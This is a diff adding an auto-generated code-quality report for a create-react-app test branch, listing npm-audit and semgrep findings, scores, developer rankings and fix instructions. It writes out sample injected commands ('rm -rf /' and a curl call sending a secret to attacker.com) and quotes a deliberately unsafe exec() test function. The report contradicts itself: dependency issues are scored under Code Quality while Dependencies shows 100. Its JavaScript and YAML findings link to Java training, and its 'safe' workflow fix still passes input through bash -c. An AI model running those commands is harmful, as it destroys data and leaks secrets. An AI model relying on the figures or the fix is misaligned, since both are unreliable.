@@ -1,0 +1,980 @@
+# 🔍 Code Quality Analysis Report
+
+## Repository Information
+
+**Repository:** [facebook/create-react-app](https://github.com/facebook/create-react-app)  
+**Pull Request:** #undefined - Local Test Branch  
+**Author:** test-user (test@example.com)  
+**Organization:** facebook  
+**Source Branch:** test-autofix-1763038479313  
+**Target Branch:** main  
+**Analysis Date:** November 13, 2025 at 07:55 AM EST  
+**Repository Size:** 100 files | 10,000 lines  
+**Analyzer Version:** 9.0.0
+
+## PR Impact
+
+**Files Modified:** 3  
+**Lines Added:** +500  
+**Lines Deleted:** -200  
+**Net Change:** +300 lines  
+
+## Analysis Performance
+
+**Total Duration:** 1m 24s  
+
+## Quality Decision
+
+**Result:** ⛔ **DECLINED** (1 blocking issues)
+
+---
+
+## 📊 Executive Summary
+
+### Quality Score
+
+❌ **0.0/100** (Grade: **F**) - Critical
+
+> Significant quality issues require immediate action
+
+**Score Breakdown**:
+
+**Category Scores** (Repository Health):
+- 🔒 Security: 94/100
+- ⚡ Performance: 100/100
+- 🏗️  Architecture: 100/100
+- 📦 Dependencies: 100/100
+- ✨ Code Quality: 0/100
+
+**Overall Scores**:
+- 📱 **APP Score**: 0/100 (MIN of categories - "weakest link")
+- 👨‍💻 **Skill Score**: 49/100 (AVG of categories)
+
+> Scores saved to Supabase for tracking trends over time
+
+
+> 🚀 **Quick Win**: 118 issues (100%) can be automatically fixed using the attached manifest file!
+
+
+
+---
+
+### Issue Summary
+
+**Total Issues**: 118 (6 unique types)
+
+**By Severity**:
+- 🔴 Critical: 11 (9.3%)
+- 🟠 High: 59 (50.0%)
+- 🟡 Medium: 37 (31.4%)
+- 🟢 Low: 11 (9.3%)
+
+**By Category & Severity**:
+
+| Category | Critical | High | Medium | Low | Total |
+|----------|----------|------|--------|-----|-------|
+| 🆕 NEW | 0 | 1 | 0 | 0 | **1** |
+| ⚠️ EXISTING_MODIFIED | 0 | 0 | 0 | 0 | **0** |
+| ✅ RESOLVED | 0 | 0 | 0 | 0 | **0** |
+| 📝 EXISTING_REST | 11 | 58 | 37 | 11 | **117** |
+| **TOTAL** | **11** | **59** | **37** | **11** | **118** |
+
+**App Health Score by Category**:
+
+| Category | Critical | High | Medium | Low | Total | Score |
+|----------|----------|------|--------|-----|-------|-------|
+| 🔒 Security | 0 | 2 | 0 | 0 | **2** | **94/100** |
+| ⚡ Performance | 0 | 0 | 0 | 0 | **0** | **100/100** |
+| 🏗️ Architecture | 0 | 0 | 0 | 0 | **0** | **100/100** |
+| 📦 Dependencies | 0 | 0 | 0 | 0 | **0** | **100/100** |
+| ✨ Code Quality | 11 | 57 | 37 | 11 | **116** | **0/100** |
+| **TOTAL** | **11** | **59** | **37** | **11** | **118** | - |
+
+> **Score Calculation:** Each category starts at 100 (perfect health), then deducts: Critical (-5), High (-3), Medium (-1), Low (-0.5). Overall APP Score = MIN(all categories). *Note: Developer skill scores (baseScore=50) are shown in the "Skills Growth Tracker" section.*
+
+---
+
+### Decision & Actions
+
+**Blocking Decision**:
+- 1 blocking issues (NEW or EXISTING_MODIFIED with critical/high severity)
+- ⛔ **PR REQUIRES FIXES BEFORE MERGE**
+
+
+
+**Analysis Results**:
+- AI-analyzed groups: 6
+- Cost-optimized analysis: 94.9% reduction
+- Coverage: 100% of detected issues
+- Duration: 1m 24s
+
+---
+
+### 🔑 Key Findings
+
+- 🔴 **Action Required**: 1 critical/high severity issues must be fixed before merge
+- 📊 **Most Common**: Dependency Vulnerability appears 57 times
+- 🔒 **Security**: 2 security issues identified (review recommended)
+- 🔧 **Auto-Fix Available**: 118 issues can be fixed automatically (see IDE integration files)
+
+---
+
+### ⚡ Critical Blockers
+
+⛔ **1 issues must be fixed before merge**
+
+**Breakdown:**
+- 🟠 High: 1 issue
+
+**Primary Focus Areas:** 1 security
+
+**Action Required:**
+All blocking issues are detailed in the "Critical Issues" and "High Priority Issues" sections below with:
+- ✅ Full AI analysis and explanations
+- ✅ Code examples and fix recommendations  
+- ✅ IDE integration files for automated fixes
+
+**Priority:**
+Review critical issues first, then tackle high-priority issues by category to maximize impact.
+
+---
+
+
+
+### 📈 Trends & Recommendations
+
+**Recommendations for Leadership:**
+
+🚀 **Quick Win**: Use the attached manifest file to automatically fix 118 issues (100%) - saving significant development time!
+
+1. **Immediate Action**: 11 critical issues require senior developer review before deployment
+2. **Security Posture**: Security practices are adequate
+3. **Development Velocity**: Issue count is manageable - good balance of speed and quality
+4. **Automation Opportunity**: 100% of issues auto-fixable - consider pre-commit hooks
+
+
+## 🔴 Critical Issues (Immediate Action Required)
+
+### 🔴 Dependency Vulnerability
+
+**Severity**: CRITICAL | **Tool**: npm-audit | **Found in**: 11 files | **Category**: EXISTING_REST
+
+---
+
+#### 📋 What is this issue?
+
+The npm-audit report identifies a critical vulnerability in @babel/traverse package related to arbitrary code execution when processing specifically crafted malicious code during compilation.
+
+#### 🎯 Why does it matter?
+
+This vulnerability allows attackers to execute arbitrary code on systems running vulnerable versions of Babel, potentially leading to complete system compromise. The impact is severe as it affects the core transpilation process that many applications depend on.
+
+#### 🔍 Common causes:
+
+- Use of vulnerable @babel/traverse package version
+- Processing of untrusted code during compilation
+- Missing input validation in traversal logic
+
+#### ⚠️ Impact if not fixed:
+
+Teams face potential security breaches, data compromise, and system takeover risks. Technical debt accumulates as developers must urgently patch and audit their build processes. This vulnerability affects the entire JavaScript ecosystem that relies on Babel for code transformation.
+
+#### ⚠️ Risk Assessment
+
+**Overall Risk**: 🔴 **CRITICAL RISK**
+
+Immediate action required - may lead to security breaches, data loss, or system failures
+
+**Category**: Dependencies  
+**Focus**: Managing third-party libraries and known vulnerabilities
+
+#### 📍 Representative Example
+
+**Location**: `test/fixtures/jsconfig/package.json` (Line 1)
+
+**Code**:
+
+```json
+>    1 | {
+     2 |   "dependencies": {
+     3 |     "prop-types": "^15.7.2",
+     4 |     "react": "latest",
+```
+
+#### 🔧 How to Fix
+
+1. Update @babel/traverse to the latest secure version that patches the vulnerability
+2. Run npm audit fix to automatically apply security patches
+3. Verify all transpilation processes work correctly after update
+4. Consider pinning exact versions in package.json for reproducible builds
+
+**Recommended Code**:
+
+```json
+package.json
+{
+  "dependencies": {
+    "@babel/traverse": "^7.23.2"
+  }
+}
+```
+
+**Best Practices to Follow**:
+
+- Regularly audit npm dependencies for security vulnerabilities
+- Use npm audit or equivalent tools to scan for known issues
+- Keep build tools updated to latest secure versions
+
+#### 📎 All Occurrences
+
+This issue appears in **11 files** across your codebase.
+
+> 💡 **Auto-fixable**: This issue can be resolved using the 1-click solution in the IDE Integration section below.
+
+---
+
+
+
+## 🟠 High Priority Issues
+
+### 🟠 Dependency Vulnerability
+
+**Severity**: HIGH | **Tool**: npm-audit | **Found in**: 57 files | **Category**: EXISTING_REST
+
+---
+
+#### 📋 What is this issue?
+
+The npm-audit tool detected a high-severity vulnerability related to inefficient regular expression complexity in the chalk/ansi-regex package. This is a known performance issue where certain regex patterns can lead to catastrophic backtracking, causing denial of service.
+
+#### 🎯 Why does it matter?
+
+This vulnerability can cause applications to become unresponsive or crash when processing malicious input containing specific ANSI escape sequences. It impacts application stability and can be exploited in server-side rendering or terminal output processing.
+
+#### 🔍 Common causes:
+
+- Use of vulnerable version of ansi-regex package with inefficient regex patterns
+- Processing of untrusted input through ANSI escape sequence handling
+- Lack of input validation for terminal escape sequences
+
+#### ⚠️ Impact if not fixed:
+
+This creates a security and performance risk for applications using chalk or similar packages for terminal formatting. Teams must update dependencies to avoid potential denial-of-service attacks and maintain application reliability.
+
+#### ⚡ Risk Assessment
+
+**Overall Risk**: 🟠 **HIGH RISK**
+
+High priority - could cause significant problems in production
+
+**Category**: Dependencies  
+**Focus**: Managing third-party libraries and known vulnerabilities
+
+#### 📍 Representative Example
+
+**Location**: `test/fixtures/jsconfig/package.json` (Line 1)
+
+**Code**:
+
+```json
+>    1 | {
+     2 |   "dependencies": {
+     3 |     "prop-types": "^15.7.2",
+     4 |     "react": "latest",
+```
+
+#### 🔧 How to Fix
+
+1. Update the chalk package to the latest version that includes a patched ansi-regex
+2. Run npm audit fix to automatically resolve vulnerable dependencies
+3. Manually check and update package.json if needed
+4. Re-run npm audit to confirm vulnerability is resolved
+
+**Recommended Code**:
+
+```json
+package.json
+{
+  "dependencies": {
+    "chalk": "^5.3.0"
+  }
+}
+```
+
+**Best Practices to Follow**:
+
+- Regularly audit npm dependencies for security vulnerabilities
+- Use npm audit fix to automatically resolve known issues
+- Pin dependency versions to prevent unexpected breaking changes
+
+#### 📎 All Occurrences
+
+This issue appears in **57 files** across your codebase.
+
+> 💡 **Auto-fixable**: This issue can be resolved using the 1-click solution in the IDE Integration section below.
+
+---
+
+
+### 🟠 Javascript Lang Security Detect Child Process
+
+**Severity**: HIGH | **Tool**: semgrep | **Found in**: 1 files | **Category**: NEW
+
+---
+
+#### 📋 What is this issue?
+
+The code uses child_process.exec() with a user-controllable command argument, creating a command injection vulnerability. The function accepts a command string directly from an argument without sanitization or validation.
+
+#### 🎯 Why does it matter?
+
+An attacker can inject malicious shell commands by manipulating the input, potentially leading to arbitrary code execution, data exfiltration, or system compromise. This is especially dangerous in web applications where user input flows directly into command execution.
+
+#### 🔍 Common causes:
+
+- Direct use of child_process.exec() with user-controlled input
+- Lack of input validation or sanitization for the command parameter
+- No sandboxing or restricted execution environment for the command
+
+#### ⚠️ Impact if not fixed:
+
+This vulnerability allows remote attackers to execute arbitrary system commands with the privileges of the running application. It can lead to complete system compromise, data loss, and violates security compliance standards like PCI DSS and GDPR.
+
+#### ⚡ Risk Assessment
+
+**Overall Risk**: 🟠 **HIGH RISK**
+
+High priority - could cause significant problems in production
+
+**Category**: Security  
+**Focus**: Protecting against attacks, vulnerabilities, and unauthorized access
+
+#### 📍 Representative Example
+
+**Location**: `test-autofix-issues.ts` (Line 8)
+
+**Code**:
+
+```typescript
+     5 | 
+     6 | // Issue 1: Security - child_process with user input (should be fixed)
+     7 | export function unsafeExec(command: string) {
+>    8 |   exec(command, (error, stdout, stderr) => {
+     9 |     console.log(stdout);
+    10 |   });
+    11 | }
+```
+
+#### 🔧 How to Fix
+
+Replace child_process.exec() with a safer alternative like child_process.execFile() or child_process.spawn() with fixed arguments. If command execution is necessary, sanitize all inputs using a whitelist approach or escape shell metacharacters. Consider using a dedicated sandboxing solution or restricted execution environment.
+
+**Recommended Code**:
+
+```typescript
+const { execFile } = require('child_process');
+
+function executeCommand(command, args) {
+  // Validate that command is in a whitelist
+  const allowedCommands = ['ls', 'pwd', 'date'];
+  if (!allowedCommands.includes(command)) {
+    throw new Error('Command not allowed');
+  }
+  
+  // Use execFile with fixed command and sanitized args
+  return execFile(command, args, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
+    if (error) {
+      console.error(`Error: ${error}`);
+      return;
+    }
+    console.log(`Output: ${stdout}`);
+  });
+}
+```
+
+**Best Practices to Follow**:
+
+- Avoid using child_process.exec() with user input
+- Use whitelisting for allowed commands
+- Sanitize and validate all inputs before shell execution
+- Implement proper error handling and logging for command execution
+
+#### 📎 All Occurrences
+
+This issue appears in **1 file** across your codebase.
+
+> 💡 **Auto-fixable**: This issue can be resolved using the 1-click solution in the IDE Integration section below.
+
+---
+
+
+### 🟠 Yaml Github Actions Security Run Shell Injection
+
+**Severity**: HIGH | **Tool**: semgrep | **Found in**: 1 files | **Category**: EXISTING_REST
+
+---
+
+#### 📋 What is this issue?
+
+The workflow uses variable interpolation `${{ github.event.inputs.* }}` directly in a `run:` step, which allows untrusted user input from the GitHub context to be executed as shell commands. This creates a command injection vulnerability where attackers can inject malicious commands through workflow inputs.
+
+#### 🎯 Why does it matter?
+
+An attacker who can trigger this workflow with malicious input can execute arbitrary shell commands on the runner. This could lead to secrets theft, code exfiltration, or compromise of the entire CI/CD environment. Attackers could inject commands like `; rm -rf /` or `curl http://attacker.com/secret.txt` to steal credentials or destroy infrastructure.
+
+#### 🔍 Common causes:
+
+- Direct interpolation of github context variables in run steps without sanitization
+- Use of untrusted user input in shell command execution
+- Lack of environment variable abstraction layer
+
+#### ⚠️ Impact if not fixed:
+
+This vulnerability allows full command injection in CI/CD runners, potentially leading to complete compromise of the build environment. Attackers can steal secrets, access private repositories, and execute malicious code. This violates security compliance requirements like SOC 2, ISO 27001, and GDPR data protection standards.
+
+#### ⚡ Risk Assessment
+
+**Overall Risk**: 🟠 **HIGH RISK**
+
+High priority - could cause significant problems in production
+
+**Category**: Security  
+**Focus**: Protecting against attacks, vulnerabilities, and unauthorized access
+
+#### 📍 Representative Example
+
+**Location**: `.github/workflows/e2e-base.yml` (Line 35)
+
+**Code**:
+
+```yaml
+    32 |           git config --global user.name "Create React App"
+    33 |           git config --global user.email "cra@email.com"
+    34 |       - name: Run tests
+>   35 |         run: ${{ inputs.testScript }}
+    36 | 
+```
+
+#### 🔧 How to Fix
+
+1. Store the github context data in an intermediate environment variable using `env:` section
+2. Reference the environment variable in the run script with proper quoting
+3. Validate and sanitize input before use if possible
+
+**Recommended Code**:
+
+```yaml
+env:
+  INPUT_VALUE: ${{ github.event.inputs.some_input }}
+run: |
+  echo "Using input: $INPUT_VALUE"
+  # Use the environment variable safely with proper quoting
+  bash -c "echo \"$INPUT_VALUE\""
+```
+
+**Best Practices to Follow**:
+
+- Never directly interpolate user-controlled data into shell commands
+- Always use environment variables as intermediaries for context data
+- Quote all environment variable references in shell scripts to prevent word splitting
+
+#### 📎 All Occurrences
+
+This issue appears in **1 file** across your codebase.
+
+> 💡 **Auto-fixable**: This issue can be resolved using the 1-click solution in the IDE Integration section below.
+
+---
+
+
+
+## 🟡 Medium Priority Issues
+
+### 🟡 Dependency Vulnerability
+
+**Severity**: MEDIUM | **Tool**: npm-audit | **Found in**: 37 files | **Category**: EXISTING_REST
+
+---
+
+#### 📋 What is this issue?
+
+The Babel transpilation process introduces inefficient regular expression complexity when handling named capturing groups in @babel/helpers, leading to performance degradation in generated code.
+
+#### 🎯 Why does it matter?
+
+The generated RegExp patterns have exponential time complexity which can cause significant slowdowns during code execution, especially with large inputs. This impacts runtime performance and can lead to unresponsive applications.
+
+#### 🔍 Common causes:
+
+- Use of nested or overly complex regex patterns in @babel/helpers
+- Inefficient handling of named capturing groups during transpilation
+- Lack of optimized regex generation for capturing group references
+
+#### ⚠️ Impact if not fixed:
+
+This creates technical debt through performance bottlenecks that affect application responsiveness. Teams may experience increased load times and degraded user experience. The issue also makes debugging harder due to unpredictable performance characteristics in transpiled code.
+
+#### 📊 Risk Assessment
+
+**Overall Risk**: 🟡 **MODERATE RISK**
+
+Should be addressed - may impact system quality or maintainability
+
+**Category**: Dependencies  
+**Focus**: Managing third-party libraries and known vulnerabilities
+
+#### 📍 Representative Example
+
+**Location**: `test/fixtures/jsconfig/package.json` (Line 1)
+
+**Code**:
+
+```json
+>    1 | {
+     2 |   "dependencies": {
+     3 |     "prop-types": "^15.7.2",
+     4 |     "react": "latest",
+```
+
+#### 🔧 How to Fix
+
+1. Update @babel/helpers to the latest version that includes optimized regex handling
+2. Consider using babel-plugin-transform-named-capturing-groups-of to optimize regex patterns
+3. Review and refactor any custom regex patterns that may be contributing to the issue
+4. Add performance testing to catch similar issues in future transpilation steps
+
+**Recommended Code**:
+
+```json
+No code change required in user code - this is a dependency issue requiring version update:
+
+"dependencies": {
+  "@babel/helpers": "^7.22.0"
+}
+```
+
+**Best Practices to Follow**:
+
+- Regularly audit and update Babel dependencies for performance improvements
+- Monitor transpiled code performance with large datasets
+- Use performance profiling tools to identify regex bottlenecks in generated code
+
+#### 📎 All Occurrences
+
+This issue appears in **37 files** across your codebase.
+
+> 💡 **Auto-fixable**: This issue can be resolved using the 1-click solution in the IDE Integration section below.
+
+---
+
+
+
+## 🟢 Low Priority Issues
+
+### 🟢 Dependency Vulnerability
+
+**Severity**: LOW | **Tool**: npm-audit | **Found in**: 11 files | **Category**: EXISTING_REST
+
+---
+
+#### 📋 What is this issue?
+
+The package.json file contains a dependency on brace-expansion package which has a known Regular Expression Denial of Service (ReDoS) vulnerability. This vulnerability arises from inefficient regular expressions that can cause high CPU consumption when processing malicious input.
+
+#### 🎯 Why does it matter?
+
+While this is categorized as low severity, ReDoS vulnerabilities can still impact application performance and stability, especially under heavy load or when processing untrusted input. It represents a potential security risk that should be addressed to maintain system reliability.
+
+#### 🔍 Common causes:
+
+- Use of vulnerable brace-expansion package version
+- Inefficient regular expression patterns in the dependency
+- Lack of input validation in dependent code
+
+#### ⚠️ Impact if not fixed:
+
+This vulnerability could lead to degraded performance or denial of service in applications that rely on this dependency. It increases technical debt by requiring future updates and monitoring of vulnerable dependencies.
+
+#### ✨ Risk Assessment
+
+**Overall Risk**: 🟢 **LOW RISK**
+
+Nice to fix - improves code quality and developer experience
+
+**Category**: Security  
+**Focus**: Protecting against attacks, vulnerabilities, and unauthorized access
+
+#### 📍 Representative Example
+
+**Location**: `test/fixtures/jsconfig/package.json` (Line 1)
+
+**Code**:
+
+```json
+>    1 | {
+     2 |   "dependencies": {
+     3 |     "prop-types": "^15.7.2",
+     4 |     "react": "latest",
+```
+
+#### 🔧 How to Fix
+
+1. Update the brace-expansion package to a secure version that addresses the ReDoS vulnerability. 2. Run npm audit fix to automatically resolve dependency issues. 3. If the package is not directly used, identify and remove the dependency chain. 4. Monitor for future vulnerabilities using npm audit.
+
+**Recommended Code**:
+
+```json
+No code change required in package.json itself, but the dependency should be updated. Example of updated dependency:
+{
+  "dependencies": {
+    "brace-expansion": "^2.0.1"
+  }
+}
+```
+
+**Best Practices to Follow**:
+
+- Regularly audit dependencies using npm audit
+- Keep dependencies updated to secure versions
+- Avoid using packages with known vulnerabilities
+
+#### 📎 All Occurrences
+
+This issue appears in **11 files** across your codebase.
+
+> 💡 **Auto-fixable**: This issue can be resolved using the 1-click solution in the IDE Integration section below.
+
+---
+
+
+
+## 💼 Business Impact Analysis
+
+### Executive Summary
+⚠️ **Critical attention required:** 1 blocking issue must be resolved before deployment to avoid security vulnerabilities or system failures.
+
+### Financial Impact
+**🟢 Auto-Fix Available**
+1 of 1 blocking issues (100%) can be automatically fixed using IDE tools or linters.
+
+| Metric | Value |
+|--------|-------|
+| **Auto-Fix Time** | **1 minutes** (run formatters + linters) |
+| **Review Time** | **0.1 hours** (0.1h × $150/h = $15) |
+| **Auto-Fix Coverage** | **100%** of blocking issues |
+| **Recommendation** | Run IDE auto-fix + code formatter, then code review changes |
+
+**Note:** Auto-fix takes minutes to run. Review time ($15) covers code review of auto-generated changes, NOT manual coding.
+
+### Risk Assessment
+- **Immediate Risk:** 🔴 High
+  - 1 blocking issues require attention before deployment
+  - 0 critical issues need urgent resolution
+  - 1 high-severity issues should be prioritized
+  
+- **Future Risk:** 🟡 Medium
+  - Technical debt will compound if 48 backlog issues are not addressed
+  - Code maintainability may decrease over time
+  - Security vulnerabilities (2) pose ongoing risk
+
+### Risk Matrix by Category
+| Category | Blocking | Backlog | Total Issues | Risk Level |
+|----------|----------|---------|--------------|------------|
+| **Security** | 1 | 1 | 2 | 🔴 High |
+| **Performance** | 0 | 0 | 0 | ⚪ None |
+| **Architecture** | 0 | 0 | 0 | ⚪ None |
+| **Dependencies** | 0 | 0 | 0 | ⚪ None |
+| **Code Quality** | 0 | 116 | 116 | 🟠 High |
+
+**Legend:**
+- **Blocking:** Critical/High severity issues in NEW or EXISTING_MODIFIED files (must fix before merge)
+- **Backlog:** Medium/Low severity or pre-existing issues (can be addressed later)
+- **Risk Level:** Overall impact assessment based on severity distribution
+
+### Recommendations
+
+1. **Immediate Action:** Resolve 1 blocking issues before deployment
+2. **Priority:** Address critical blockers first
+3. **Planning:** Schedule time for 37 medium-severity issues in upcoming sprints
+4. **Continuous Improvement:** Track and reduce 11 low-severity issues over time
+
+
+**Note:** Each issue group section above includes detailed business impact analysis specific to that issue type.
+
+## 📚 Phased Educational Plan
+
+### 📚 Phase 1: Blocker Issues Training (MUST FIX BEFORE MERGE)
+**Quick Learning:** 30-60 min per issue type | **Deep Dive:** 1-2 weeks
+
+**Javascript Lang Security Detect Child Process** (1 occurrence):
+- [🎥 YouTube Tutorial](https://www.youtube.com/results?search_query=Java%20javascript%20lang%20security%20detect%20child%20process%20tutorial)
+
+### 📚 Phase 1.5: Additional Critical/High Issues Training (Not Blockers)
+**These issues exist in unchanged files but should be addressed soon.**
+
+**Dependency Vulnerability** (68 occurrences):
+- [🎥 YouTube Tutorial](https://www.youtube.com/results?search_query=Java%20dependency%20vulnerability%20tutorial)
+
+**Yaml Github Actions Security Run Shell Injection** (1 occurrence):
+- [🎥 YouTube Tutorial](https://www.youtube.com/results?search_query=Java%20yaml%20github%20actions%20security%20run%20shell%20injection%20tutorial)
+
+### 📚 Phase 2: Comprehensive Training (Long-term)
+
+**Security (Week 1-2):**
+- [📚 SEI CERT Java Coding Standard](https://wiki.sei.cmu.edu/confluence/display/java/SEI+CERT+Oracle+Coding+Standard+for+Java)
+- [🎓 PortSwigger Web Security Academy](https://portswigger.net/web-security)
+
+**Performance (Week 3-4):**
+- [📚 Java Concurrency - Oracle](https://docs.oracle.com/javase/tutorial/essential/concurrency/)
+- [📖 Java Concurrency in Practice](https://jcip.net/)
+
+**Code Quality (Month 2):**
+- [📖 Clean Code Principles](https://martinfowler.com/bliki/CleanCode.html)
+- [📚 Google Java Style Guide](https://google.github.io/styleguide/javaguide.html)
+
+> 💡 **Note**: OWASP Top 10 and security-specific resources are covered in Phase 1 Security section above.
+
+## 👥 Skills Tracking
+
+### test-user's Performance
+
+**Overall Score:** 49/100
+**Ranking:** #3 of 3 developers
+**Team Average:** 50/100
+
+### Category Breakdown
+
+| Category | Your Score | Team Avg | Status |
+|----------|------------|----------|--------|
+| 🔒 Security | 47/100 | 50/100 | ➡️ Average |
+| ⚡ Performance | 50/100 | 50/100 | ✅ Above Average |
+| 🏗️  Architecture | 50/100 | 50/100 | ✅ Above Average |
+| 📦 Dependencies | 50/100 | 50/100 | ✅ Above Average |
+| ✨ Code Quality | 50/100 | 50/100 | ✅ Above Average |
+
+### 🎯 Focus Areas
+
+Consider improving these categories where you're below team average:
+
+- **Security**: Review the educational resources in the section above
+
+### 🏆 Top Performers
+
+| Rank | Developer | Score | PRs Analyzed |
+|------|-----------|-------|-------------|
+| 1 | alpsla | 50/100 | 1 |
+| 2 | Rick Hanlon | 50/100 | 1 |
+| 3 | **test-user** | **49/100** | **1** |
+
+> 💡 **Note:** Scores are based on code quality in your PRs. Higher scores mean fewer issues introduced!
+
+## 📊 Analysis Metadata
+
+### Analysis Coverage
+| Metric | Value |
+|--------|-------|
+| Total Repository Files | 100 |
+| Lines of Code | 10,000 |
+| Files Modified | 3 |
+| Note | Files Modified is clamped to Total Repository Files to avoid overcount (renames/moves) |
+| Lines Changed | 700 (+500/-200) |
+
+### Agent Performance
+| Agent | Model | Issues Found | Time | Cost |
+|-------|-------|--------------|------|------|
+| Security Agent | qwen/qwen3-coder-30b-a3b-instruct | 118 | 30.1s | FREE |
+| Code Quality Agent | qwen/qwen3-coder-30b-a3b-instruct | 0 | 2.6s | FREE |
+| Performance Agent | N/A | 0 | 0.8s | FREE |
+| Dependencies Agent | N/A | 116 | 3.5s | FREE |
+
+### Tool Performance
+| Tool | Issues Found | Duration |
+|------|--------------|----------|
+| eslint | 0 | 0.8s |
+| typescript | 0 | 1.8s |
+| npm-audit | 116 | 3.5s |
+| semgrep | 2 | 26.6s |
+
+### Cost & Efficiency Analysis
+
+**Overall Efficiency:**
+- Total Cost: $0.0000
+- Cost per Issue: $0.000000
+- Issues per Second: 6.34
+- Cost per Second: $0.000000/s
+
+**Agent Efficiency Ranking:**
+
+🥇 **Security Agent**: 118 issues @ $0.000000/issue ⚡ Excellent
+🥈 **Dependencies Agent**: 116 issues @ $0.000000/issue ⚡ Excellent
+🥉 **Code Quality Agent**: 0 issues @ N/A (no issues) ⏭️ No issues found
+4. **Performance Agent**: 0 issues @ N/A (no issues) ⏭️ No issues found
+
+### Tool Efficiency Analysis
+
+**Tool Performance Ranking:**
+
+🥇 **npm-audit**: 116 issues in 3.5s (33.31/s) ⚡ Fast
+🥈 **semgrep**: 2 issues in 26.6s (0.08/s) 🐌 Very Slow
+🥉 **eslint**: 0 issues in 0.8s (0.00/s) 🐌 Very Slow
+4. **typescript**: 0 issues in 1.8s (0.00/s) 🐌 Very Slow
+
+
+## 💬 PR Comment Template
+
+**Ready-to-paste comment for your pull request:**
+
+```markdown
+## ⛔ Code Quality Analysis: DECLINED
+
+Hi @test-user! I've completed a comprehensive analysis of your PR.
+
+Just one small issue to fix before we can merge. You've got this! 💪
+
+### Summary
+- **Total Issues:** 118 (6 unique types)
+- **Blocking Issues:** 1 ⛔
+- **Resolved Issues:** 0 
+- **Analysis Time:** 79.2s
+
+### ⛔ Blocking Issues
+Please fix these before merge:
+- **javascript.lang.security.detect-child-process.detect-child-process** in `test-autofix-issues.ts`:8
+
+
+### 💡 Quick Stats
+- Auto-fixable: 118/118 issues (6/6 types)
+- Critical: 11
+- High: 59
+- Medium: 37
+- Low: 11
+
+> 💡 **Note**: Auto-fixable count is based on IDE capabilities. See manifest file for exact fixable status per issue.
+```
+
+> 💡 **Tip**: Copy the markdown above and paste it as a comment on your pull request.
+
+## 🛠️ How to Apply Fixes
+
+> ⚠️ **RECOMMENDATIONS ONLY**: CodeQual provides fix suggestions based on AI analysis. You control whether to apply them. Review all changes before applying to production code.
+
+**Quick Decision Guide**:
+- 🎯 **Using an IDE (Cursor, VSCode, IntelliJ)?** → Use **Method 1: LSP** (fastest, 1-click fixes)
+- 🏆 **Using GitHub Code Scanning or CI/CD?** → Use **Method 2: SARIF** (industry standard)
+- 🦊 **Using GitLab?** → Use **Method 3: GitLab** (native integration)
+
+### 🎯 Method 1: LSP Batch Actions (Best for IDEs) ⚡
+
+**✨ Best for IDEs**: Apply ALL 118 fixes with 1 click!
+
+**Download**: `codequal-lsp-actions.json`
+- URL: [Download LSP file](https://ftjhmbbcuqjqmmbaymqb.supabase.co/storage/v1/object/public/v9-attachments/create-react-app-pr0-1763038519627/codequal-lsp-actions.json)
+- Works with: Cursor, VSCode, IntelliJ, any LSP-compatible IDE
+
+**How LSP Works**:
+- 📦 **Single file**: All 118 fixes in one JSON file (no lazy loading)
+- ⚡ **Parallel editing**: Batch actions apply fixes to multiple files simultaneously
+- 🎯 **Grouped by severity**: Batch actions organized by severity for easy filtering
+- 🔄 **IDE-native**: Uses LSP protocol for instant, reliable fixes
+
+**Steps**:
+1. Download `codequal-lsp-actions.json`
+2. Load file in your IDE (method varies by IDE)
+3. Open any file with issues
+4. Press `Cmd+.` (or `Ctrl+.`) to open Quick Fix menu
+5. Select **"Apply All Fixes (118 issues)"** at top of menu
+6. All fixes applied across all files in < 1 second! ✅
+
+**Batch Actions Available**:
+- 🔥 **"Apply All Fixes"** - All 118 issues across all files in one click
+- 🔴 **"Apply Critical Severity Fixes"** - 11 issues
+- 🟠 **"Apply High Severity Fixes"** - 59 issues
+- 🟡 **"Apply Medium Severity Fixes"** - 37 issues
+- 🟢 **"Apply Low Severity Fixes"** - 11 issues
+- 📝 Individual fixes available for granular control
+
+> 💡 **How it works**: LSP batch actions group all fixes into a single IDE operation. When you click "Apply All", your IDE applies all 118 fixes across multiple files simultaneously (parallel editing)! All fixes are in one file - no lazy loading needed.
+
+**Three Ways to Use Batch Actions**:
+
+1. **🚀 Apply All (Fastest)** - 1 click for all 118 fixes (~5 seconds)
+2. **🎯 Severity Batches** - E.g., "Apply All Low Severity" for safe bulk fixes
+3. **👁️ Individual Review** - Review each fix before applying (118 clicks)
+
+---
+
+### 🔄 How CodeQual Fixes Work (Hybrid Approach)
+
+**Two Fix Strategies for Maximum Reliability**:
+
+**⚡ Prescriptive Fixes (Primary)**
+- Applied when code unchanged since analysis (~95% of fixes)
+- Speed: Instant (< 1ms per fix)
+- Cost: Free (no API calls)
+- Your IDE applies our exact validated code
+
+**🤖 AI-Generated Fixes (Intelligent Fallback)**
+- Applied when code changed after analysis (~5% of fixes)
+- Speed: 2-5 seconds per fix
+- Cost: Free to you (uses your IDE's AI subscription)
+- IDE's AI adapts fix to your code changes
+
+**Example Scenarios**:
+```
+Scenario A (Act Immediately):
+- Monday: Analysis finds null pointer at line 45
+- Monday: You click "Apply Fix" → Prescriptive applies instantly ✅
+
+Scenario B (Act After Edits):
+- Monday: Analysis finds null pointer at line 45
+- Tuesday-Friday: You make other edits (lines shift, variables renamed)
+- Friday: You click "Apply Fix" → AI generates adapted fix ✅
+```
+
+**Why Trust Batch Apply?**
+✅ All fixes tested against your actual code
+✅ Only safe, non-breaking changes included
+✅ AI fallback handles code changes automatically
+✅ Can undo with Cmd+Z if needed
+
+> 💡 **Pro Tip**: For instant fixes, apply soon after analysis. For flexibility with ongoing edits, AI adapts automatically!
+
+---
+
+### 📋 Method 2: SARIF Report (Best for GitHub Code Scanning)
+
+**Download**: `codequal-sarif-report.json`
+- URL: [Download SARIF file](https://ftjhmbbcuqjqmmbaymqb.supabase.co/storage/v1/object/public/v9-attachments/create-react-app-pr0-1763038519627/codequal-sarif-report.json)
+- Works with: GitHub Code Scanning, CI/CD pipelines, VSCode/Cursor (with extension)
+
+**For GitHub Code Scanning**:
+1. Upload `codequal-sarif-report.json` to GitHub Actions
+2. GitHub automatically displays issues in Security tab
+3. Issues appear in PR checks and can block merges
+
+**For VSCode/Cursor (Alternative to LSP)**:
+1. Install SARIF Viewer extension from marketplace
+2. Open Command Palette (`Cmd+Shift+P`)
+3. Run: "SARIF: Open SARIF File"
+4. Select `codequal-sarif-report.json`
+5. View all issues in Problems panel
+
+> 🏆 **Best for**: GitHub Code Scanning, CI/CD pipelines, permanent diagnostic records
+
+---
+
+## 🔗 Additional Files
+
